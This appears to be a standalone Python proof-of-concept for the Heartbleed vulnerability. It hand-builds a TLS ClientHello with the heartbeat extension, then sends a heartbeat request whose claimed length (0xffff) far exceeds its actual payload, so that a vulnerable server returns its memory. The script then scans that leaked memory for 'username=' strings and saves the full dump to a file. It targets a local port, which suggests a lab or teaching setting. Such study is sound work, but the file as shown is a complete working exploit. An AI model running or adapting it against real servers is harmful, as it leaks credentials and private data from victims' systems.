import socket
import hexdump

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr)

tls_hello_s = "1603020034010000300302615d9acb434f4445434f4445434f4445434f4445434f4445434f4445434f4445000002002f01000005ff01000100"
# tls_hello = bytes.fromhex(tls_hello_s)
# tls_heartbeat_s = "180302000301ffff"

tls_ver = 0x02

client_hello2 = [
    # TLS header ( 5 bytes)
    0x16,               # Content type (0x16 for handshake)
    0x03, tls_ver,         # TLS Version
    0x00, 0xdc,         # Length
    # Handshake header
    0x01,               # Type (0x01 for ClientHello)
    0x00, 0x00, 0xd8,   # Length
    0x03, tls_ver,         # TLS Version
    # Random (32 byte)
    0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
    0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
    0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
    0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
    0x00,               # Session ID length
    0x00, 0x66,         # Cipher suites length
    # Cipher suites (51 suites)
    0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
    0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
    0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
    0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
    0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
    0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
    0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
    0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
    0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
    0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
    0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
    0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
    0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
    0x01,               # Compression methods length
    0x00,               # Compression method (0x00 for NULL)
    0x00, 0x49,         # Extensions length
    # Extension: ec_point_formats
    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
    # Extension: elliptic_curves
    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
    0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
    0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
    0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
    # Extension: SessionTicket TLS
    0x00, 0x23, 0x00, 0x00,
    # Extension: Heartbeat
    0x00, 0x0f, 0x00, 0x01, 0x01
]

client_hello = [
    # tls header ( 5 bytes)
    0x16,                           # content type (0x16 for handshake)
    0x03, tls_ver,                  # tls version
    0x00, 0x34,                     # length

    # handshake header
    0x01,                           # type (0x01 for clienthello)
    0x00, 0x00, 0x30,               # length
    0x03, tls_ver,                  # tls version

    # random payload data (32 byte) - "code" repeated x8 times
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,
    0x43, 0x4f, 0x44, 0x45, 0x43, 0x4f, 0x44, 0x45,

    0x00,                           #session ID length (would be followed by session ID if non-zero)

    0x00, 0x02,                     # Cipher suites length in bytes

    # List of cipher suites supported, each are 2bytes
    0x00, 0x2f,                     # Cipher suite RSA/RSA/AES 128/CBC/SHA (RFC 5246)
    0x01,                           # number of compression methods to follow
    0x00,                           # the compression method "no compression"
    0x00, 0x05,                     # length of extensions
    # 0xff, 0x01, 0x00, 0x01, 0x00,   # Extension: renegotiation info
    0x00, 0x0f, 0x00, 0x01, 0x01   # Extension: HB
]

tls_hello = bytes.fromhex(hex2bin(client_hello))
# tls_hello = bytes.fromhex(tls_hello_s)

# tls_heartbeat_s = "180302000301ffff"
tls_heartbeat_s = [
    0x18,       # Content Type (Heartbeat)
    0x03, tls_ver,  # TLS version
    0x00, 0x09,  # Actual Payload Length (+ some overhead, 3 here)
    0x01,       # Type (Request)
    0xff, 0xff,  # Crafted Payload length
    # Payload Data (potato)
    0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F
]

# HEARTBEAT = "\
# 18 \
# 03 {tls_revision:02X} {payload_length:04X} \
# 01 {claimed_length:04X} {payload} \
# "

tls_heartbeat = bytes.fromhex(hex2bin(tls_heartbeat_s))
# tls_heartbeat = bytes.fromhex('180302000901FFFF2f2f2f2f2f2f')

print(f"HB: {tls_heartbeat}")

def findCredentials(r, key):
    startIndex = r.find(key.encode())

    if startIndex == -1:
        return -1

    # Find first non-decodable character.
    endIndex = startIndex + len(key)
    trucking = True
    while trucking:
        try:
            c = r[startIndex:endIndex + 1]
            ss = c.decode('utf-8')
            endIndex += 1
        except UnicodeDecodeError:
            trucking = False
    print(r[startIndex:endIndex].decode())
    
    return endIndex

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('127.0.0.1', 4433)
print('[Connecting to {} port {}]'.format(*server_address))
s.connect(server_address)

try:
    s.sendall(tls_hello)     # Send Client Hello
    s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
    s.sendall(tls_heartbeat) # Send badly formed Heartbeat Request
    r = s.recv(64*1024)      # Receive server memory!

    index = 0
    while index < len(r) and index != -1:
        index = findCredentials(r[index:], "username=")
    print(f"\nComplete hexdump saved to hexd.hex\n")
    # hexdump.hexdump(r)
    with open("hexd.hex", "wb") as f:
        f.write(r)
    

finally:
    print('[Closing socket]')
    s.close()